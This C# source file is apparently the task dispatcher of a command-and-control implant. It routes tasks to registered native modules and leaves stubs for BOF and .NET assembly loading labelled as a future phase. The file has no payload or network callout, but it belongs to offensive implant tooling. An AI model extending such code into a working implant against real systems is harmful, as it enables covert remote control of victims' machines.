using System;
using System.Collections.Generic;
using System.Text;
using Agent.NativeModules;
using Agent.Protocol;

namespace Agent.Core
{
    /// <summary>
    /// Routes incoming tasks to the correct executor based on task type.
    /// </summary>
    public class TaskDispatcher
    {
        private readonly Dictionary<string, INativeModule> _nativeModules =
            new Dictionary<string, INativeModule>(StringComparer.OrdinalIgnoreCase);

        public void RegisterModule(INativeModule module)
        {
            _nativeModules[module.Name] = module;
        }

        /// <summary>
        /// Execute a task and return the result bytes.
        /// </summary>
        public byte[] Execute(byte taskType, string moduleName, byte[] payload,
            byte[] arguments)
        {
            switch (taskType)
            {
                case Constants.TASK_NATIVE:
                    return ExecuteNative(moduleName, arguments);

                case Constants.TASK_BOF:
                    // COFF loader — Phase 2
                    return Encoding.UTF8.GetBytes(
                        "[!] BOF execution not yet implemented (Phase 2)");

                case Constants.TASK_ASSEMBLY:
                    // Assembly loader — Phase 2
                    return Encoding.UTF8.GetBytes(
                        "[!] Assembly execution not yet implemented (Phase 2)");

                case Constants.TASK_CONFIG:
                    return Encoding.UTF8.GetBytes("[*] Config applied");

                case Constants.TASK_EXIT:
                    return Encoding.UTF8.GetBytes("[*] Agent exiting");

                default:
                    return Encoding.UTF8.GetBytes(
                        string.Format("[!] Unknown task type: 0x{0:X2}", taskType));
            }
        }

        private byte[] ExecuteNative(string moduleName, byte[] arguments)
        {
            INativeModule module;
            if (!_nativeModules.TryGetValue(moduleName, out module))
            {
                return Encoding.UTF8.GetBytes(
                    string.Format("[!] Unknown native module: {0}", moduleName));
            }

            try
            {
                return module.Execute(arguments);
            }
            catch (Exception ex)
            {
                return Encoding.UTF8.GetBytes(
                    string.Format("[!] Module {0} error: {1}", moduleName, ex.Message));
            }
        }

        public bool HasModule(string name)
        {
            return _nativeModules.ContainsKey(name);
        }
    }
}
